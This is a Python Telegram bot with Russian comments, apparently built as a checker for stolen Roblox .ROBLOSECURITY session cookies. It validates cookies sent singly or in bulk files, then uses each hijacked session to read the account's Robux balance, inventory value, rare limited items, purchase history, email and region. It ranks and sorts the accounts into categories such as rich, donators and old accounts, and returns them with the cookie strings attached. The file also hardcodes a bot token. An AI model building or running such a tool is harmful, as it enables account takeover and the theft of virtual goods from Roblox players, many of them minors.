import telebot
import requests
import io
import re
import zipfile
from datetime import datetime, timedelta
from flask import Flask
from threading import Thread
import os

# === НАСТРОЙКИ ===
TOKEN = '8526516729:AAHxx09k48kWRk0U7q2AcFSCmEdg3TDcfEw'
bot = telebot.TeleBot(TOKEN)

app = Flask(__name__)

@app.route('/')
def home():
    return "Бот активен!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# Дорогие лимиты для проверки
EXPENSIVE_LIMITEDS = {
    1364898: "Korblox Deathspeaker",
    1364899: "Korblox Deathspeaker (Left)",
    484742933: "Dominus Frigidus",
    62234425: "Headless Horseman",
    251884365: "Valkyrie Helm",
    74626161: "Sparkle Time Fedora"
}

GAME_DATA = {
    "BRAZILIAN SPYDER": {"name": "Steal a brainrot", "universe_id": 6144841331},
    "Uplift Games": {"name": "Adopt me", "universe_id": 231221121},
    "Wave of Brainrots": {"name": "Tsunami brainrots", "universe_id": 6344131331},
    "Nikilis": {"name": "MM2", "universe_id": 66654135},
    "The Garden Game": {"name": "GAG", "universe_id": 5834131131},
    "KizmoTek Studio": {"name": "War tycoon", "universe_id": 2686721523},
    "Gamer Robot Inc": {"name": "Blox fruits", "universe_id": 444227218}
}

def extract_cookie(text):
    match = re.search(r"(_\|WARNING:-DO-NOT-SHARE-THIS\..+)", text)
    return match.group(1).strip() if match else None

def get_extra_info(u_id, cookies):
    """Получение расширенной информации об аккаунте"""
    try:
        u_data = requests.get(f"https://users.roblox.com/v1/users/{u_id}", timeout=10).json()
        reg_dt = datetime.strptime(u_data.get('created', '2000-01-01T00:00:00.000Z'), 
                                  "%Y-%m-%dT%H:%M:%S.%fZ")
        days = (datetime.now() - reg_dt).days
        premium = "Да ✅" if u_data.get('hasPremium', False) else "Нет ❌"
        
        # Друзья
        try:
            f_data = requests.get(f"https://friends.roblox.com/v1/users/{u_id}/friends/count", 
                                 timeout=5).json()
            friends_count = f_data.get('count', 0)
        except:
            friends_count = 0
        
        # Почта (базовая проверка)
        email_verified = "Неизвестно"
        try:
            # Попытка получить информацию о почте
            email_req = requests.get("https://accountsettings.roblox.com/v1/email",
                                   cookies=cookies, timeout=5)
            if email_req.status_code == 200:
                email_data = email_req.json()
                email_verified = "Да ✅" if email_data.get('verified', False) else "Нет ❌"
            else:
                email_verified = "Нет ❌"
        except:
            email_verified = "Ошибка проверки"
        
        # Регион (через языковые настройки)
        region = "Неизвестно"
        try:
            locale_req = requests.get("https://locale.roblox.com/v1/locales/user-locale",
                                    cookies=cookies, timeout=5)
            if locale_req.status_code == 200:
                locale_data = locale_req.json()
                region = locale_data.get('locale', {}).get('name', 'Неизвестно')
        except:
            pass
        
        return {
            'reg_date': reg_dt.strftime("%d.%m.%Y"),
            'age_days': days,
            'premium': premium,
            'friends': friends_count,
            'email': email_verified,
            'region': region
        }
    except Exception as e:
        print(f"Ошибка в get_extra_info: {e}")
        return {'reg_date': "??", 'age_days': 0, 'premium': "??", 'friends': 0, 
                'email': "??", 'region': "??"}

def get_created_places(u_id):
    """Получение созданных игр"""
    try:
        url = f"https://games.roblox.com/v2/users/{u_id}/games?accessFilter=Public&limit=10&sortOrder=Desc"
        res = requests.get(url, timeout=5).json()
        games = [g['name'] for g in res.get('data', [])[:5]]
        return games
    except:
        return []

def get_game_badges(u_id, universe_id, cookies):
    """Получение бейджей игры"""
    try:
        url = f"https://badges.roblox.com/v1/users/{u_id}/universes/{universe_id}/badges?limit=3"
        res = requests.get(url, cookies=cookies, timeout=3).json()
        badges = [b['name'] for b in res.get('data', [])[:2]]
        return " (🏆: " + ", ".join(badges) + ")" if badges else ""
    except:
        return ""

def get_playtime_data(u_id, cookies):
    """Получение времени в играх"""
    try:
        url = f"https://badges.roblox.com/v1/users/{u_id}/badges?limit=30"
        res = requests.get(url, cookies=cookies, timeout=10).json()
        
        playtime_per_game = {}
        total_playtime = 0
        
        for badge in res.get('data', []):
            try:
                if 'awardedDate' in badge and 'createdDate' in badge:
                    awarded = datetime.strptime(badge['awardedDate'], "%Y-%m-%dT%H:%M:%S.%fZ")
                    created = datetime.strptime(badge['createdDate'], "%Y-%m-%dT%H:%M:%S.%fZ")
                    minutes = (awarded - created).total_seconds() / 60
                    
                    if 0 < minutes < 10080:  # Фильтр
                        universe_id = badge.get('universeId')
                        if universe_id:
                            game_name = get_game_name(universe_id, cookies)
                            if game_name not in playtime_per_game:
                                playtime_per_game[game_name] = 0
                            playtime_per_game[game_name] += minutes
                            total_playtime += minutes
            except:
                continue
        
        # Сортируем по убыванию времени
        sorted_playtime = dict(sorted(playtime_per_game.items(), key=lambda x: x[1], reverse=True)[:10])
        
        return {
            'total_playtime_hours': total_playtime / 60,
            'playtime_per_game': {k: f"{v/60:.1f}ч" for k, v in sorted_playtime.items()}
        }
    except Exception as e:
        print(f"Ошибка в get_playtime_data: {e}")
        return {'total_playtime_hours': 0, 'playtime_per_game': {}}

def get_detailed_spending(u_id, cookies):
    """Детализированная статистика донатов"""
    try:
        url = f"https://economy.roblox.com/v2/users/{u_id}/transactions?transactionType=Purchase&limit=50"
        res = requests.get(url, cookies=cookies, timeout=10).json()
        
        transactions = res.get('data', [])
        
        total_spent_all_time = 0
        spent_last_year = 0
        spent_per_game = {}
        
        one_year_ago = datetime.now() - timedelta(days=365)
        
        for transaction in transactions:
            try:
                amount = abs(transaction.get('currency', {}).get('amount', 0))
                created_str = transaction.get('created')
                
                if created_str:
                    created = datetime.strptime(created_str, "%Y-%m-%dT%H:%M:%S.%fZ")
                    total_spent_all_time += amount
                    
                    if created >= one_year_ago:
                        spent_last_year += amount
                
                # Разбивка по играм
                details = transaction.get('details', {})
                if details:
                    game_name = details.get('name', 'Неизвестная игра')
                    if game_name not in spent_per_game:
                        spent_per_game[game_name] = 0
                    spent_per_game[game_name] += amount
            except:
                continue
        
        # Сортируем по убыванию доната
        sorted_spending = dict(sorted(spent_per_game.items(), key=lambda x: x[1], reverse=True)[:10])
        
        return {
            'total_spent_all_time': total_spent_all_time,
            'spent_last_year': spent_last_year,
            'spent_per_game': sorted_spending
        }
    except Exception as e:
        print(f"Ошибка в get_detailed_spending: {e}")
        return {'total_spent_all_time': 0, 'spent_last_year': 0, 'spent_per_game': {}}

def get_inventory_value(u_id, cookies):
    """Получение RAP и проверка дорогих лимитов"""
    try:
        # Получаем коллекционные предметы
        url = f"https://inventory.roblox.com/v1/users/{u_id}/inventory?assetTypes=Collectibles&limit=50"
        res = requests.get(url, cookies=cookies, timeout=10).json()
        
        items = res.get('data', [])
        expensive_items = []
        limited_items = []
        
        # Проверяем на дорогие лимиты
        for item in items:
            asset_id = item.get('assetId')
            if asset_id in EXPENSIVE_LIMITEDS:
                expensive_items.append(EXPENSIVE_LIMITEDS[asset_id])
            
            # Собираем все лимиты
            if item.get('assetType', '').lower() == 'collectible':
                limited_items.append(item.get('name', 'Неизвестный предмет'))
        
        # Получаем RAP (Recent Average Price)
        rap_url = f"https://economy.roblox.com/v1/users/{u_id}/assets/collectibles?limit=10"
        rap_res = requests.get(rap_url, cookies=cookies, timeout=5).json()
        
        total_rap = 0
        if 'data' in rap_res:
            for asset in rap_res['data']:
                total_rap += asset.get('recentAveragePrice', 0)
        
        return {
            'total_rap': total_rap,
            'expensive_items': expensive_items[:5],
            'limited_items': limited_items[:10],
            'has_korblox': any("Korblox" in item for item in expensive_items)
        }
    except Exception as e:
        print(f"Ошибка в get_inventory_value: {e}")
        return {'total_rap': 0, 'expensive_items': [], 'limited_items': [], 'has_korblox': False}

def get_game_name(universe_id, cookies):
    """Получение названия игры по universe_id"""
    try:
        url = f"https://games.roblox.com/v1/games?universeIds={universe_id}"
        res = requests.get(url, cookies=cookies, timeout=5).json()
        return res['data'][0]['name'] if res.get('data') else f"Universe_{universe_id}"
    except:
        return f"Universe_{universe_id}"

def check_cookie(raw_text):
    """Основная функция проверки куки"""
    cookie = extract_cookie(raw_text)
    if not cookie:
        return {"status": "error"}
    
    cookies = {".ROBLOSECURITY": cookie}
    
    try:
        # Базовая информация
        u_req = requests.get("https://users.roblox.com/v1/users/authenticated", 
                           cookies=cookies, timeout=15)
        
        if u_req.status_code != 200:
            return {"status": "error"}
        
        u = u_req.json()
        u_id, u_name = u['id'], u['name']
        
        # Расширенная информация
        extra_info = get_extra_info(u_id, cookies)
        
        # Баланс
        try:
            robux_data = requests.get(f"https://economy.roblox.com/v1/users/{u_id}/currency", 
                                    cookies=cookies, timeout=5).json()
            robux = robux_data.get('robux', 0)
        except:
            robux = 0
        
        # Созданные игры
        created_games = get_created_places(u_id)
        
        # Время в играх
        playtime_data = get_playtime_data(u_id, cookies)
        
        # Детализированные донаты
        spending_data = get_detailed_spending(u_id, cookies)
        
        # RAP и лимиты
        inventory_data = get_inventory_value(u_id, cookies)
        
        # Траты по играм из GAME_DATA
        spent_per_game = {}
        total_spent = 0
        try:
            sales = requests.get(f"https://economy.roblox.com/v2/users/{u_id}/transactions?transactionType=Purchase&limit=30", 
                               cookies=cookies, timeout=10).json()
            
            if 'data' in sales:
                for item in sales['data'][:20]:
                    amount = abs(item.get('currency', {}).get('amount', 0))
                    creator = item.get('agent', {}).get('name', 'Unknown')
                    if creator in GAME_DATA:
                        g_name = GAME_DATA[creator]["name"]
                        if g_name not in spent_per_game:
                            badges = get_game_badges(u_id, GAME_DATA[creator]["universe_id"], cookies)
                            spent_per_game[g_name] = {"sum": 0, "badges": badges}
                        spent_per_game[g_name]["sum"] += amount
                        total_spent += amount
        except:
            pass
        
        details_text = "".join([f" • {n}: {d['sum']} R$ {d['badges']}\n" for n, d in spent_per_game.items()])
        
        return {
            "status": "ok",
            "name": u_name,
            "id": u_id,
            "robux": robux,
            **extra_info,
            "created_games": created_games,
            **playtime_data,
            **spending_data,
            **inventory_data,
            "details": details_text or "Трат нет\n",
            "spent": total_spent,
            "spent_dict": spent_per_game,
            "cookie": cookie
        }
    except Exception as e:
        print(f"Критическая ошибка в check_cookie: {e}")
        return {"status": "error"}

def format_output(res):
    """Форматирование вывода"""
    games_str = "\n • " + "\n • ".join(res['created_games'][:5]) if res['created_games'] else "Нет созданных игр"
    
    # Время в играх
    playtime_str = f"{res['total_playtime_hours']:.1f} часов"
    if res['playtime_per_game']:
        playtime_str += "\nТоп игр по времени:\n"
        for game, time in list(res['playtime_per_game'].items())[:5]:
            playtime_str += f"   • {game}: {time}\n"
    
    # Донаты
    spent_games_str = ""
    if res['spent_per_game']:
        for game, amount in list(res['spent_per_game'].items())[:5]:
            spent_games_str += f"   • {game}: {amount} R$\n"
    
    # Дорогие лимиты
    limiteds_str = ", ".join(res['expensive_items'][:3]) if res['expensive_items'] else "Нет"
    
    # Все лимиты
    all_limiteds_str = ", ".join(res['limited_items'][:5]) if res['limited_items'] else "Нет"
    
    # Список игр с донатом
    games_with_spending = list(res['spent_per_game'].keys())
    games_spending_str = ", ".join(games_with_spending[:5]) + ("..." if len(games_with_spending) > 5 else "") if games_with_spending else "Нет"
    
    # Список игр с временем
    games_with_playtime = list(res['playtime_per_game'].keys())
    games_playtime_str = ", ".join(games_with_playtime[:5]) + ("..." if len(games_with_playtime) > 5 else "") if games_with_playtime else "Нет"
    
    output = f"""
👤 АККАУНТ: {res['name']} (ID: {res['id']})
🗓 Регистрация: {res['reg_date']} ({res['age_days']} дн.)
📍 РЕГИОН: {res['region']}
📧 ПРИВЯЗАНА ПОЧТА: {res['email']}
🌟 PREMIUM: {res['premium']}
👥 ДРУЗЕЙ: {res['friends']}

💰 ФИНАНСЫ:
Баланс: {res['robux']} R$
RAP (стоимость инвентаря): {res['total_rap']} R$

🎮 ВРЕМЯ В ИГРАХ:
Всего отыграно: {playtime_str}

💸 ДОНАТЫ:
За всё время: {res['total_spent_all_time']} R$
За последний год: {res['spent_last_year']} R$
Топ донатов по играм:
{spent_games_str or '   • Нет данных'}

🕹️ ИГРЫ:
Созданные игры: {games_str}
Игры с донатом: {games_spending_str}
Игры с отыгранным временем: {games_playtime_str}

💎 ЦЕННЫЕ ЛИМИТЫ:
Дорогие лимиты: {limiteds_str}
Все лимиты: {all_limiteds_str}
{'✅ Есть Korblox/Headless' if res['has_korblox'] else '❌ Нет Korblox/Headless'}

💸 ТРАТЫ ПО ОТСЛЕЖИВАЕМЫМ ИГРАМ:
{res['details']}
--- Всего по списку: {res['spent']} R$ ---

🍪 КУКИ (первые 100 символов):
{res['cookie'][:100]}...

{'='*50}
"""
    return output

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "👋 Привет! Пришли куки или .txt файл.")

@bot.message_handler(content_types=['text', 'document'])
def handle(message):
    try:
        if message.content_type == 'text' and len(message.text) > 100:
            res = check_cookie(message.text)
            if res['status'] == 'ok': 
                bot.send_message(message.chat.id, format_output(res))
            else:
                bot.send_message(message.chat.id, "❌ Невалидный куки или ошибка при проверке")
        
        elif message.content_type == 'document':
            file_info = bot.get_file(message.document.file_id)
            file_content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
            lines = file_content.splitlines()
            
            bot.send_message(message.chat.id, f"⌛ Чек {len(lines)} строк...")
            
            valid_data = []
            for i, line in enumerate(lines):
                if line.strip():
                    print(f"Проверка строки {i+1}/{len(lines)}")
                    res = check_cookie(line)
                    if res['status'] == 'ok': 
                        valid_data.append(res)
                    if len(valid_data) >= 30:  # Ограничим 30 аккаунтами
                        break
            
            if valid_data:
                # Генерация расширенной сводки
                total_robux = sum(d['robux'] for d in valid_data)
                total_rap = sum(d['total_rap'] for d in valid_data)
                total_playtime = sum(d['total_playtime_hours'] for d in valid_data)
                total_spent_all = sum(d['total_spent_all_time'] for d in valid_data)
                total_spent_year = sum(d['spent_last_year'] for d in valid_data)
                
                best_friends = max(valid_data, key=lambda x: x['friends'])
                oldest_acc = max(valid_data, key=lambda x: x['age_days'])
                best_dev = max(valid_data, key=lambda x: len(x['created_games']))
                richest_rap = max(valid_data, key=lambda x: x['total_rap'])
                top_spender = max(valid_data, key=lambda x: x['total_spent_all_time'])
                
                # Считаем аккаунты с премиум, почтой и дорогими лимитами
                premium_count = sum(1 for d in valid_data if d['premium'] == "Да ✅")
                email_count = sum(1 for d in valid_data if "Да ✅" in d['email'])
                korblox_count = sum(1 for d in valid_data if d['has_korblox'])
                
                stats = f"📊 РАСШИРЕННАЯ СВОДКА ПО ФАЙЛУ ({len(valid_data)} акк.):\n\n"
                stats += f"💰 ОБЩИЙ БАЛАНС: {total_robux} R$\n"
                stats += f"💎 ОБЩИЙ RAP: {total_rap} R$\n"
                stats += f"🕐 ОБЩЕЕ ВРЕМЯ В ИГРАХ: {total_playtime:.1f} ч\n"
                stats += f"💸 ОБЩИЙ ДОНАТ (всё время): {total_spent_all} R$\n"
                stats += f"📅 ДОНАТ ЗА ГОД: {total_spent_year} R$\n\n"
                
                stats += f"👴 САМЫЙ СТАРЫЙ АКК: {oldest_acc['name']} ({oldest_acc['age_days']} дн.)\n"
                stats += f"👥 МАКС ДРУЗЕЙ: {best_friends['name']} ({best_friends['friends']})\n"
                stats += f"🛠 ТОП ДЕВЕЛОПЕР: {best_dev['name']} ({len(best_dev['created_games'])} игр)\n"
                stats += f"💎 БОГАЧ (RAP): {richest_rap['name']} ({richest_rap['total_rap']} R$)\n"
                stats += f"💸 ТОП ДОНАТ: {top_spender['name']} ({top_spender['total_spent_all_time']} R$)\n\n"
                
                stats += f"📈 СТАТИСТИКА:\n"
                stats += f"   • Premium аккаунтов: {premium_count}\n"
                stats += f"   • С привязанной почтой: {email_count}\n"
                stats += f"   • С Korblox/Headless: {korblox_count}\n\n"
                
                stats += "🏆 ТОП ТРАТ ПО ИГРАМ:\n"
                game_totals = {}
                for g_id, g_info in GAME_DATA.items():
                    g_name = g_info['name']
                    total = sum(d['spent_dict'].get(g_name, {}).get('sum', 0) for d in valid_data)
                    if total > 0:
                        game_totals[g_name] = total
                
                for game, total in sorted(game_totals.items(), key=lambda x: x[1], reverse=True)[:7]:
                    stats += f"🥇 {game}: {total} R$\n"
                
                # Отправка файлов
                if len(valid_data) <= 10:
                    buf = io.BytesIO("".join([format_output(d) for d in valid_data]).encode('utf-8'))
                    buf.name = "results.txt"
                    bot.send_document(message.chat.id, buf)
                else:
                    zip_buf = io.BytesIO()
                    with zipfile.ZipFile(zip_buf, 'w', zipfile.ZIP_DEFLATED) as zip_file:
                        # Категории
                        files = {
                            "robux.txt": [d for d in valid_data if d['robux'] > 0],
                            "rap_rich.txt": [d for d in valid_data if d['total_rap'] > 1000],
                            "developers.txt": [d for d in valid_data if len(d['created_games']) > 0],
                            "donators.txt": [d for d in valid_data if d['total_spent_all_time'] > 0],
                            "premium.txt": [d for d in valid_data if d['premium'] == "Да ✅"],
                            "old_accounts.txt": [d for d in valid_data if d['age_days'] > 365],
                            "all_valid.txt": valid_data
                        }
                        for name, data in files.items():
                            if data:
                                content = "".join([format_output(d) for d in data])
                                zip_file.writestr(name, content)
                    
                    zip_buf.seek(0)
                    zip_buf.name = "checker_results.zip"
                    bot.send_document(message.chat.id, zip_buf, caption="📦 Результаты разделены по категориям")
                
                bot.send_message(message.chat.id, stats)
            else:
                bot.send_message(message.chat.id, "❌ Валид не найден.")
    except Exception as e: 
        print(f"Ошибка в handle: {e}")
        bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)[:200]}")

if __name__ == '__main__':
    # Запускаем Flask в отдельном потоке
    flask_thread = Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    # Запускаем бота
    print("🤖 Бот запускается...")
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except Exception as e:
        print(f"Ошибка при запуске бота: {e}")
